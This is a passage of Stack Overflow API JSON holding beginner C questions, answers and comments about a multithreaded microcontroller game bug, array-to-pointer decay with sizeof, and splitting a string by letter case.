"https://stackoverflow.com/users/4685116/ing-gerardo-s%c3%a1nchez"}, "is_accepted": false, "score": 0, "last_activity_date": 1457570506, "creation_date": 1457570506, "answer_id": 35905512, "question_id": 35903049, "link": "https://stackoverflow.com/questions/35903049/c-why-is-my-px-variable-zero/35905512#35905512", "title": "C, Why is my &#39;px&#39; variable zero?", "body": "<p>You are creating 3 threads, BUT YOU ARE NOT TAKING CARE ABOUT WRITE MEMORY COLLISIONS.</p>\n\n<p>Two threads are using px: <strong>game_thread</strong> and <strong>render_thread</strong>, maybe <strong>lcd_display_char_xy</strong> in render_thread takes px referenced, and modifies it in a unspected time.</p>\n\n<p>I suggest you try using a \"<strong>int pxg</strong>\" for exclusive use of game_thread and other \"<strong>int pxr</strong>\" for exclusive use in render_thread (and remove int px). It must solve the problem.</p>\n\n<p>Or, just for test, you could comment <strong>lcd_display_char_xy('.', px, py);</strong>, and px in game_thread must work in expected way.</p>\n"}, {"tags": [], "owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "is_accepted": false, "score": 0, "last_activity_date": 1457572903, "creation_date": 1457572903, "answer_id": 35905890, "question_id": 35903049, "link": "https://stackoverflow.com/questions/35903049/c-why-is-my-px-variable-zero/35905890#35905890", "title": "C, Why is my &#39;px&#39; variable zero?", "body": "<p>Well it seemed to be an optimisation issue. I was initially using the optimisation flag <strong>-Os</strong> and after changing it to <strong>-O3</strong> or <strong>-Ofast</strong> it seemed to run perfectly :)</p>\n\n<p>I don't know what on earth was going on with the size optimised code but it appeared that the compiler had split the game_thread code into a couple of jumbled pieces...</p>\n\n<p>Thanks for the help everyone! :D</p>\n"}], "owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 1, "answer_count": 3, "score": 1, "last_activity_date": 1457572903, "creation_date": 1457559119, "last_edit_date": 1457564581, "question_id": 35903049, "link": "https://stackoverflow.com/questions/35903049/c-why-is-my-px-variable-zero", "title": "C, Why is my &#39;px&#39; variable zero?", "body": "<p>Ok, the bug is strange and I have no idea what's going on.\nI'm running my code on an at90usb1286.</p>\n\n<p>Here's the problematic code:</p>\n\n<pre><code>        uint16_t r = rand();\n        t1 = r;\n\n        px = r%52;\n        t2 = px;\n\n        py = r%28;\n        t3 = py;\n\n        px = px * 6;\n        t4 = px;\n\n        py = py * 8;\n        t5 = py;\n\n        py += 8;\n</code></pre>\n\n<p><strong>Context:</strong></p>\n\n<p>The t# variables are temporary variables I am using to debug this...\nThey are displayed on a connected display. px and py are just global uint16_ts.</p>\n\n<p><strong>The Bug:</strong></p>\n\n<p>All t# variables except t4 display sensible values, but t4 remains 0 no matter what value is displayed for t2.</p>\n\n<p>Why!!!?</p>\n\n<p>It's been screwing with my mind for hours! :'(</p>\n\n<p>Thanks for any advice! :)\nI know this probably isn't a good way to use random's though :P </p>\n\n<p>(I've tagged arduino as I suspect it may be similar)</p>\n\n<p>Rest of the code:\n(I have tried with the global vars non-static aswell)</p>\n\n<pre><code>#include \"util/cli.h\"\n#include \"drivers/lcd/syscalls.h\"\n#include \"drivers/input/syscalls.h\"\n#include \"drivers/led/syscalls.h\"\n#include \"drivers/scheduler/syscalls.h\"\n#include &lt;util/delay.h&gt;\n\nstatic int x = 0, y = 0;\n\nstatic int px;\nstatic int py; /*Pickup*/\n\nstatic uint16_t score = 0;\n\nstatic uint8_t dir; /*0 -&gt; NESW &lt;- 3*/\n\nstatic uint16_t t1, t2, t3, t4, t5;\n\nvoid render_thread() {\n    lcd_clear_screen();\n\n    while(1) {\n        cli();\n        lcd_display_char_xy(' ', x, y);\n        if(dir &amp; 0x01)\n            y -= 8;\n\n        if(dir &amp; 0x02)\n            x += 6;\n\n        if(dir &amp; 0x04)\n            y += 8;\n\n        if(dir &amp; 0x08)\n            x -= 6;\n\n        if(x &lt; 0)\n            x = 0;\n        if(y &lt; 8)\n            y = 8;\n        if(x &gt; 312)\n            x = 312;\n        if(y &gt; 232)\n            y = 232;\n\n        lcd_display_char_xy('.', px, py);\n        lcd_display_char_xy('@', x, y);\n        /*Display score*/\n        lcd_display_move(0, 0);\n        lcd_display_hex(&amp;score, 2);\n\n        /*Display test variables*/\n        lcd_display_move(60, 0);\n        lcd_display_hex(&amp;t1, 2);\n        lcd_display_move(100, 0);\n        lcd_display_hex(&amp;t2, 2);\n        lcd_display_move(140, 0);\n        lcd_display_hex(&amp;t3, 2);\n        lcd_display_move(180, 0);\n        lcd_display_hex(&amp;t4, 2);\n        lcd_display_move(220, 0);\n        lcd_display_hex(&amp;t5, 2);\n        sei();\n        _delay_ms(16);\n    }\n}\n\nvoid game_thread() {\n    px = 24;\n    py = 32;\n\n    while(1) {\n        cli();\n        if(px == x &amp;&amp; py == y) {\n            uint16_t r = rand();\n            t1 = r;\n\n            px = r%52;\n            t2 = px;\n\n            py = r%28;\n            t3 = py;\n\n            px = px * 6;\n            t4 = px;\n\n            py = py * 8;\n            t5 = py;\n\n            py += 8;\n            score++;\n        }\n        sei();\n        scheduler_switch();\n    }\n}\n\nvoid user_thread() {\n    while(1) {\n        if(switch_north())\n            dir |= 1;\n        else\n            dir &amp;= 0x0E;\n\n        if(switch_east())\n            dir |= 1&lt;&lt;1;\n        else\n            dir &amp;= 0x0D;\n\n        if(switch_south())\n            dir |= 1&lt;&lt;2;\n        else\n            dir &amp;= 0x0B;\n\n        if(switch_west())\n            dir |= 1&lt;&lt;3;\n        else\n            dir &amp;= 0x07;\n\n        scheduler_switch();\n    }\n}\n\nvoid cli_start() {\n    Task* game_task = scheduler_create_task(game_thread, 128);\n    scheduler_submit_task(game_task);\n\n    Task* render_task = scheduler_create_task(render_thread, 128);\n    scheduler_submit_task(render_task);\n\n    Task* user_task = scheduler_create_task(user_thread, 128);\n    scheduler_submit_task(user_task);\n}\n</code></pre>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 7, "creation_date": 1457558955, "post_id": 35902995, "comment_id": 59466326, "body": "Whoever taught you that an array is a pointer was very wrong, as you can see from this example. Just ignore it. I&#39;m not sure what there is to explain. <code>sizeof(a)</code> gives you the size of the array in bytes."}, {"owner": {"reputation": 1510, "user_id": 1319819, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/49cee2918420827e36c2490b5caa9a11?s=128&d=identicon&r=PG&f=1", "display_name": "SandBag_1996", "link": "https://stackoverflow.com/users/1319819/sandbag-1996"}, "edited": false, "score": 0, "creation_date": 1457559881, "post_id": 35902995, "comment_id": 59466872, "body": "I guess my statement was an oversimplification of what i intended to say. Not wrong, but oversimplified. Point taken. Will remove comments"}, {"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "reply_to_user": {"reputation": 1510, "user_id": 1319819, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/49cee2918420827e36c2490b5caa9a11?s=128&d=identicon&r=PG&f=1", "display_name": "SandBag_1996", "link": "https://stackoverflow.com/users/1319819/sandbag-1996"}, "edited": false, "score": 0, "creation_date": 1457560546, "post_id": 35902995, "comment_id": 59467192, "body": "@UnderDog Or just plain wrong. At least, it is a mental model that causes so much confusion as to be counter-productive."}, {"owner": {"reputation": 1510, "user_id": 1319819, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/49cee2918420827e36c2490b5caa9a11?s=128&d=identicon&r=PG&f=1", "display_name": "SandBag_1996", "link": "https://stackoverflow.com/users/1319819/sandbag-1996"}, "reply_to_user": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 0, "creation_date": 1457560821, "post_id": 35902995, "comment_id": 59467332, "body": "@juanchopanza, I wont stoop down and argue on such levels. It was not plain wrong, it was an oversimplified version of what I wanted to say. It &quot;can be&quot; treated as a constant pointer to first element. I will zip it and move on. seems you have lot of time on your hands to issue such demeaning statements."}, {"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "reply_to_user": {"reputation": 1510, "user_id": 1319819, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/49cee2918420827e36c2490b5caa9a11?s=128&d=identicon&r=PG&f=1", "display_name": "SandBag_1996", "link": "https://stackoverflow.com/users/1319819/sandbag-1996"}, "edited": false, "score": 0, "creation_date": 1457561043, "post_id": 35902995, "comment_id": 59467470, "body": "@UnderDog Given that this is a question about why an array <i>isn&#39;t</i> a pointer, I don&#39;t think pointing out that your oversimplification is wrong is stooping down to any level. There&#39;s already too much confusion about that, and it gets tedious to see more people perpetrating it."}], "answers": [{"comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 0, "creation_date": 1457559446, "post_id": 35903106, "comment_id": 59466615, "body": "&quot;When you call a function and pass an array as an argument, it gets converted into a pointer to the first element.&quot; If the parameter is a pointer. The key is that the parameter has to be a pointer, and  pointer is just a pointer."}, {"owner": {"reputation": 76876, "user_id": 287586, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/tB5AG.png?s=128&g=1", "display_name": "dan04", "link": "https://stackoverflow.com/users/287586/dan04"}, "reply_to_user": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 2, "creation_date": 1457559965, "post_id": 35903106, "comment_id": 59466910, "body": "@juanchopanza: There&#39;s no \u201cif\u201d; passing an array as a function argument <i>always</i> causes it to decay to a pointer.  If you declare <code>int f(int a[])</code>, it&#39;s as if you had written <code>int f(int *a)</code>, and <code>sizeof(a)</code> inside the function will return the size of a pointer."}, {"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "reply_to_user": {"reputation": 76876, "user_id": 287586, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/tB5AG.png?s=128&g=1", "display_name": "dan04", "link": "https://stackoverflow.com/users/287586/dan04"}, "edited": false, "score": 0, "creation_date": 1457560115, "post_id": 35903106, "comment_id": 59466972, "body": "@dan04 The point is that a function can&#39;t have an array as parameter. So one doesn&#39;t even have to consider the possibility that one is dealing with an array, because the parameter is a pointer. Either that, or passing an array as argument will result in compiler error."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 1, "creation_date": 1457560412, "post_id": 35903106, "comment_id": 59467116, "body": "Of course, it&#39;s not just &quot;When you call a function and pass an array as an argument&quot;.  It&#39;s whenever an array appears in an expression, other than just to the right of <code>&amp;</code> or <code>sizeof</code>."}, {"owner": {"reputation": 19025, "user_id": 17826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5a7aca325b6be746ea9e9ae17ff5b6b?s=128&d=identicon&r=PG", "display_name": "Mark Bessey", "link": "https://stackoverflow.com/users/17826/mark-bessey"}, "reply_to_user": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1457571881, "post_id": 35903106, "comment_id": 59471717, "body": "@SteveSummit, that&#39;s a good point. I&#39;ll edit the answer a bit."}], "tags": [], "owner": {"reputation": 19025, "user_id": 17826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5a7aca325b6be746ea9e9ae17ff5b6b?s=128&d=identicon&r=PG", "display_name": "Mark Bessey", "link": "https://stackoverflow.com/users/17826/mark-bessey"}, "is_accepted": false, "score": 3, "last_activity_date": 1457572339, "last_edit_date": 1457572339, "creation_date": 1457559369, "answer_id": 35903106, "question_id": 35902995, "link": "https://stackoverflow.com/questions/35902995/why-i-get-the-length-of-an-array-like-this/35903106#35903106", "title": "Why I get the length of an array like this?", "body": "<blockquote>\n  <p>They always taught me that an array that it is a pointer</p>\n</blockquote>\n\n<p>That's your problem, right there. <em>When you call a function and pass an array as an argument</em>, it gets converted into a pointer to the first element. Otherwise, they're not equivalent. In particular, an array has an address, a type, and a size, whereas a pointer just has an address and a type.</p>\n\n<p>This is a pretty common confusion among people learning C for the first time, and even some textbooks get it wrong.</p>\n\n<p>edit: there are a few other cases where arrays \"decay\" to pointers, typically when they're used in an expression. See one of the other fine answers for a more-exhaustive treatment.</p>\n"}, {"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 4, "last_activity_date": 1457559413, "creation_date": 1457559413, "answer_id": 35903121, "question_id": 35902995, "link": "https://stackoverflow.com/questions/35902995/why-i-get-the-length-of-an-array-like-this/35903121#35903121", "title": "Why I get the length of an array like this?", "body": "<p>An array decays to a pointer to the first element of the array in most expressions. There are two cases where it does not and hence the outcome is not the same.</p>\n\n<pre><code>int array[5];\nint* ptr = array;   // Array decays to a pointer, OK.\n\n// Same\nint a = array[0];\nint a = ptr[0];\n\n// Same\nvoid foo(int*);\nfoo(array);\nfoo(ptr);\n\n// Not same\nsize_t s = sizeof(array);  // s is 5*sizeof(int)\nsize_t s = sizeof(ptr);    // s is sizeof(int*)\n\n// Not same\nint (*p1)[5] = &amp;array;     // p1 is a pointer to \"an array of 5 ints\"\nint **p1 = &amp;ptr;           // p1 is a pointer to \"an int*\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4837, "user_id": 153959, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/15a4f076a5f105fb883657391397d660?s=128&d=identicon&r=PG", "display_name": "Rob Jones", "link": "https://stackoverflow.com/users/153959/rob-jones"}, "is_accepted": false, "score": 1, "last_activity_date": 1457559794, "last_edit_date": 1495541270, "creation_date": 1457559484, "answer_id": 35903137, "question_id": 35902995, "link": "https://stackoverflow.com/questions/35902995/why-i-get-the-length-of-an-array-like-this/35903137#35903137", "title": "Why I get the length of an array like this?", "body": "<p>An array can decay to a pointer, but that does not mean an array is a pointer. See <a href=\"https://stackoverflow.com/questions/1641957/is-an-array-name-a-pointer-in-c\">this SO question</a> for details.</p>\n\n<p><code>sizeof</code> returns the size (in bytes) of the data type of its operand.  In this case, the data type is an array of int of length three.  But, since an int can be represented in different ways on different platforms, you must divide by the <code>sizeof(int)</code> to get the length. </p>\n\n<p>See <a href=\"http://www.gnu.org/software/gnu-c-manual/gnu-c-manual.html#The-sizeof-Operator\" rel=\"nofollow noreferrer\">here</a> for more details on <code>sizeof</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 4, "last_activity_date": 1457577523, "last_edit_date": 1457577523, "creation_date": 1457559652, "answer_id": 35903172, "question_id": 35902995, "link": "https://stackoverflow.com/questions/35902995/why-i-get-the-length-of-an-array-like-this/35903172#35903172", "title": "Why I get the length of an array like this?", "body": "<p><code>sizeof a</code> returns the size of the entire array in storage units (bytes).  <code>sizeof (int)</code> returns the size of a single integer in storage units.  Since <code>a</code> is an array of 3 integers, <code>sizeof a / sizeof (int)</code> gives you 3.</p>\n\n<blockquote>\n  <p>They always taught me that an array that it is a pointer</p>\n</blockquote>\n\n<p>\"They\" taught you incorrectly.  Unless it is the operand of the <code>sizeof</code> or unary <code>&amp;</code> operators, an array <em>expression</em> will be converted (\"decay\") to a pointer expression, and the value of the pointer expression will be the address of the first element of the array, but an array <em>object</em> is not a pointer.  </p>\n\n<p>When you declare <code>a</code>, what you get in memory looks something like this:</p>\n\n<pre><code>  +---+\na:|   | a[0]\n  +---+\n  |   | a[1]\n  +---+\n  |   | a[2]\n  +---+\n</code></pre>\n\n<p>There is no object <code>a</code> that's separate from the array elements; there's no pointer anywhere.  </p>\n"}], "owner": {"reputation": 131, "user_id": 2124987, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9PRTK.jpg?s=128&g=1", "display_name": "GDG612", "link": "https://stackoverflow.com/users/2124987/gdg612"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 148, "favorite_count": 0, "closed_date": 1457559863, "accepted_answer_id": 35903121, "answer_count": 4, "score": 1, "last_activity_date": 1457577523, "creation_date": 1457558906, "last_edit_date": 1457560249, "question_id": 35902995, "link": "https://stackoverflow.com/questions/35902995/why-i-get-the-length-of-an-array-like-this", "closed_reason": "Duplicate", "title": "Why I get the length of an array like this?", "body": "<p>If I have:</p>\n\n<pre><code>int a[] = {1,2,3};\nint len = sizeof(a) / sizeof(int);\n</code></pre>\n\n<p>I get 3, and I don't understand why.</p>\n\n<p>They always taught me that an array is a pointer, doesn't store its length, but only the pointer to the first element.</p>\n\n<p>Can someone explain this to me in a better way?</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457558836, "post_id": 35902911, "comment_id": 59466254, "body": "<code>i &lt;= LEN</code> will exceed the bounds of <code>str[]</code> whose maximum index is <code>6</code>. It will also break the two target arrays, whose maximum index is <code>7</code>."}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1457558884, "post_id": 35902911, "comment_id": 59466286, "body": "Add the line <code>smallStr[indexSmall] = bigStr[indexBig] = 0</code> to add the null character"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 1, "creation_date": 1457559160, "post_id": 35902911, "comment_id": 59466453, "body": "Please get rid of the <a href=\"http://stackoverflow.com/a/34522206/721269\">system(&quot;PAUSE&quot;);</a> before it hurts someone. For all you know, the <code>PAUSE</code> command on my computer pauses the cooling system for my nuclear reactor."}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1457559219, "post_id": 35902911, "comment_id": 59466483, "body": "... It plays havoc with my pacemaker as well"}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457559677, "post_id": 35902911, "comment_id": 59466761, "body": "@WeatherVane Oops, I miscounted OP&#39;s characters. He&#39;s got seven of them, not eight!"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "reply_to_user": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1457560186, "post_id": 35902911, "comment_id": 59467011, "body": "@DavidSchwartz <code>system(&quot;pause&quot;)</code> is likely to &quot;hurt someone&quot;? Really? There is such a thing as unnecessary exaggeration."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1457560204, "post_id": 35902911, "comment_id": 59467021, "body": "@asker What is your understanding of what a string is?"}], "answers": [{"comments": [{"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1457559178, "post_id": 35903042, "comment_id": 59466462, "body": "You missing out the nub of the problem - the null character"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1457560186, "post_id": 35903042, "comment_id": 59467012, "body": "You might need another go :-)"}], "tags": [], "owner": {"reputation": 702, "user_id": 4175394, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UgM8O.png?s=128&g=1", "display_name": "stryku", "link": "https://stackoverflow.com/users/4175394/stryku"}, "is_accepted": false, "score": 0, "last_activity_date": 1457577413, "last_edit_date": 1457577413, "creation_date": 1457559103, "answer_id": 35903042, "question_id": 35902911, "link": "https://stackoverflow.com/questions/35902911/program-prints-unrelated-chars/35903042#35903042", "title": "Program prints unrelated chars", "body": "<p>You should consider using <code>isupper()</code> and <code>islower()</code> functions. Code would be cleaner. And what if you have some non alpha characters? Your conditions won't work.</p>\n\n<pre><code>for (i = 0; i &lt; LEN; i++)\n{\n    if (islower(str[i]))\n    {\n        smallStr[indexSmall] = str[i];\n        indexSmall++;\n    }\n    else if (isupper(str[i]))\n    {\n        bigStr[indexBig] = str[i];\n        indexBig++;\n    }\n}\n</code></pre>\n\n<p>As @Ed Heal mention. To avoid printing rubbish, after for loopt you should add a null characters to arrays. </p>\n\n<pre><code>smallStr[indexSmall] = '\\0';\nbigStr[indexBig] = '\\0';\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 8652, "user_id": 2040863, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IspsC.jpg?s=128&g=1", "display_name": "John Hascall", "link": "https://stackoverflow.com/users/2040863/john-hascall"}, "edited": false, "score": 0, "creation_date": 1457577341, "post_id": 35906247, "comment_id": 59473318, "body": "This <code>int len = strlen(str);</code> ... <code>char smallStr[len];</code> makes the array 1 space too small."}, {"owner": {"reputation": 192, "user_id": 5947477, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NkNmP.jpg?s=128&g=1", "display_name": "anita2R", "link": "https://stackoverflow.com/users/5947477/anita2r"}, "reply_to_user": {"reputation": 8652, "user_id": 2040863, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IspsC.jpg?s=128&g=1", "display_name": "John Hascall", "link": "https://stackoverflow.com/users/2040863/john-hascall"}, "edited": false, "score": 0, "creation_date": 1457614445, "post_id": 35906247, "comment_id": 59492482, "body": "@John Hascall - yes of course - no space for the null terminator if  characters are all upper or all lower.  I will correct it."}], "tags": [], "owner": {"reputation": 192, "user_id": 5947477, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NkNmP.jpg?s=128&g=1", "display_name": "anita2R", "link": "https://stackoverflow.com/users/5947477/anita2r"}, "is_accepted": false, "score": 2, "last_activity_date": 1457614505, "last_edit_date": 1457614505, "creation_date": 1457575256, "answer_id": 35906247, "question_id": 35902911, "link": "https://stackoverflow.com/questions/35902911/program-prints-unrelated-chars/35906247#35906247", "title": "Program prints unrelated chars", "body": "<p>Don't define length before you create the string to test.\nCreate it's length after defining the string to test.</p>\n\n<p>Copy the characters as you encounter them, but as @Ed Heal says you must add a null terminator so that you can print out the two strings (they aren't really strings until they are null terminated).</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nint main (void)\n{\n        char str[] = \"SHaddOW\";\n        int len = strlen(str) +1;\n        char smallStr[len], bigStr[len];\n        char term[] = {'\\0'};\n        int n, s, b;\n\n        s=0;\n        b=0;\n        for(n=0; n&lt;len; n++) {\n                if(islower(str[n])) {\n                        memcpy(smallStr +s,  str +n, 1);\n                        s++;\n                } else if (isupper(str[n])){\n                        memcpy(bigStr +b,  str +n, 1);\n                        b++;\n                }\n        }\n        memcpy(smallStr + s, term, 1);\n        memcpy(bigStr + b , term, 1 );\n\n        printf(\"Upper: %s\\n\", bigStr);\n        printf(\"Lower: %s\\n\", smallStr);\n}\n</code></pre>\n\n<p>Output:</p>\n\n<p>Upper: SHOW<br>\nLower: add</p>\n\n<p>Add this to the if structure (and other code to support it)</p>\n\n<pre><code>} else {\n        memcpy(anyStr +a, str +n, 1);\n        a++;\n}\n</code></pre>\n\n<p>then:\nchar str[] = \".S1H2a3d4d5O6W.\";<br>\nand:<br>\nprintf(\"Anything else: %s\\n\", anyStr);</p>\n\n<p>returns:<br>\nUpper: SHOW<br>\nLower: add<br>\nAnything else: .123456.</p>\n"}, {"tags": [], "owner": {"reputation": 8652, "user_id": 2040863, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IspsC.jpg?s=128&g=1", "display_name": "John Hascall", "link": "https://stackoverflow.com/users/2040863/john-hascall"}, "is_accepted": false, "score": 2, "last_activity_date": 1457615753, "last_edit_date": 1457615753, "creation_date": 1457578158, "answer_id": 35906680, "question_id": 35902911, "link": "https://stackoverflow.com/questions/35902911/program-prints-unrelated-chars/35906680#35906680", "title": "Program prints unrelated chars", "body": "<p>A more compact approach with (perhaps) more meaningful variable names:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;string.h&gt;\n\nint main ( void ) {\n    const char  str[]   = \"SHaddOW\";\n    size_t      len     = strlen(str);    /* better to get actual length */\n    char        lowers[len + 1];          /* add one for the nul char */\n    char        uppers[len + 1];          /* (see below) */\n    int         c;\n    int         i       = 0;\n    int         n_upper = 0;\n    int         n_lower = 0;\n\n    while ((c = str[i++]) != '\\0') {\n        if (isupper(c)) uppers[n_upper++] = c;    /* no need to reinvent */\n        if (islower(c)) lowers[n_lower++] = c;    /* the wheel here */\n    }\n    uppers[n_upper] = '\\0';                  /* the nul char ('\\0') marks */\n    lowers[n_lower] = '\\0';                  /* the end of a C \"string\" */\n\n    printf(\"1: %s\\n\", lowers);\n    printf(\"2: %s\\n\", uppers);\n    return 0;\n}\n</code></pre>\n\n<h2>Notes</h2>\n\n<p>If you are super concerned about efficiency you could add an <code>else</code> before <code>if (islower...</code></p>\n\n<p>Adding <code>const</code> means you \"promise\" the characters in the array won't be changed.</p>\n\n<p>The type <code>size_t</code> is an integer type, but may be larger than <code>int</code>.  It is the correct type for the return of 